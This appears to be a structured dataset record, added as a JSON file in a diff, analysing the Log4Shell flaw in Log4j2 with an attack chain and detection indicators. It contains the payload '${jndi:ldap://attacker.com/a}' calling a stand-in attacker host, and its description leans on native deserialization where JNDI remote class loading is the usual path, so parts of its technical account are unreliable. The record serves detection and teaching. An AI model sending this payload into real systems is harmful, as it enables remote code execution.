@@ -1,0 +1,102 @@
+{
+  "package_info": {
+    "package_name": "Log4j2 (Log4Shell context)",
+    "package_manager": "Maven (Java ecosystem)",
+    "package_versions": "2.0-beta9 through 2.14.1",
+    "why_malicious": "The Log4Shell vulnerability (CVE-2021-44228) in Log4j2 allows attackers to exploit unsafe Java deserialization via JNDI lookups embedded in log messages, enabling remote code execution. The root cause is the combination of Log4j2's support for JNDI lookups in log message patterns and Java's insecure native serialization mechanism, which together allow arbitrary object instantiation and code execution when untrusted input is logged."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (log message processing)",
+        "file_location": "org/apache/logging/log4j/core/pattern/PatternLayout.java and org/apache/logging/log4j/core/lookup/JndiLookup.java",
+        "required_permissions": [
+          "network",
+          "class loading",
+          "JNDI access"
+        ]
+      },
+      "code_snippet": "${jndi:ldap://attacker.com/a}",
+      "code_language": "java (expression in log message)",
+      "code_behavior": "At runtime, when a log message containing a JNDI lookup pattern is processed by Log4j2, the logging framework evaluates the pattern, performs a network request to the specified LDAP server, retrieves a remote object reference or serialized payload, and initiates further processing that can lead to code execution.",
+      "malice_analysis": {
+        "why_suspicious": "This behavior allows untrusted user input in log messages to trigger outbound network requests and load or deserialize remote objects, which is a direct vector for remote code execution if the remote server is controlled by an attacker.",
+        "violated_expectations": "Logging frameworks are expected to treat log message content as inert data, not to evaluate or execute user-controlled input or perform network lookups based on log message content.",
+        "similar_legitimate_use": "JNDI lookups are legitimate for internal resource discovery in enterprise Java applications, but not when triggered by arbitrary, user-supplied log message content.",
+        "key_indicators": [
+          "User-controlled input in log messages triggers outbound JNDI/LDAP network requests",
+          "Presence of ${jndi:...} patterns in log processing logic",
+          "JNDI lookups executed during log message formatting"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "deserialization (runtime, after JNDI lookup)",
+        "file_location": "JVM internals (ObjectInputStream.readObject)",
+        "required_permissions": [
+          "class loading",
+          "filesystem",
+          "network (if payload requires)"
+        ]
+      },
+      "code_snippet": "ObjectInputStream.readObject() // on attacker-controlled data",
+      "code_language": "java",
+      "code_behavior": "At runtime, after a JNDI lookup retrieves a serialized object from an attacker-controlled LDAP server, the JVM deserializes the attacker-supplied data using ObjectInputStream.readObject(), which instantiates arbitrary classes and executes their readObject() methods, resulting in arbitrary code execution if malicious gadget chains are present.",
+      "malice_analysis": {
+        "why_suspicious": "Deserializing untrusted data from a remote source is a critical security risk, as it can trigger execution of attacker-supplied code via exploitation of deserialization gadget chains.",
+        "violated_expectations": "Applications should never deserialize data from untrusted or unauthenticated sources without strict validation, class whitelisting, or filtering.",
+        "similar_legitimate_use": "Deserialization is legitimate for trusted, internal data exchange where both endpoints are authenticated and data integrity is assured, but not for arbitrary data received over the network.",
+        "key_indicators": [
+          "Deserialization of data received from untrusted network sources",
+          "No validation or filtering of classes during deserialization",
+          "Use of ObjectInputStream.readObject() on data returned from JNDI lookups"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker sends a crafted log message containing a JNDI lookup pattern (e.g., ${jndi:ldap://attacker.com/a}) to a vulnerable application.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "JNDI lookup is triggered, causing the application to contact the attacker's LDAP server."
+    },
+    {
+      "step": 2,
+      "action": "The application performs a JNDI lookup to the attacker-controlled LDAP server, which responds with a reference to a remote Java class or serialized object.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "The application fetches and attempts to deserialize the remote object."
+    },
+    {
+      "step": 3,
+      "action": "The application deserializes the attacker-supplied object using ObjectInputStream.readObject(), which can execute arbitrary code via gadget chains.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Remote code execution on the vulnerable server (final goal)."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Log message processing triggers outbound JNDI/LDAP lookups to external servers",
+      "Deserialization of data received from untrusted network sources during log processing",
+      "Unexpected or unauthorized class loading during deserialization after JNDI lookups"
+    ],
+    "file_indicators": [
+      "Presence of ${jndi:ldap://...} or similar patterns in application log files",
+      "Use of ObjectInputStream.readObject() on data received from network or JNDI sources"
+    ],
+    "network_indicators": [
+      "Outbound LDAP or RMI requests to untrusted or external domains initiated during log processing",
+      "Unexpected JNDI lookups to external servers observed in application network traffic"
+    ],
+    "how_to_detect": "Monitor application logs for the presence of ${jndi:} patterns, especially those referencing external LDAP or RMI servers. Detect and alert on outbound JNDI/LDAP requests from application servers, particularly those initiated during log message processing. Audit application code for unsafe deserialization of untrusted data, especially via ObjectInputStream.readObject() on data returned from JNDI lookups. Use security tools to block or alert on deserialization of untrusted classes and on network requests to suspicious domains during logging operations."
+  }
+}
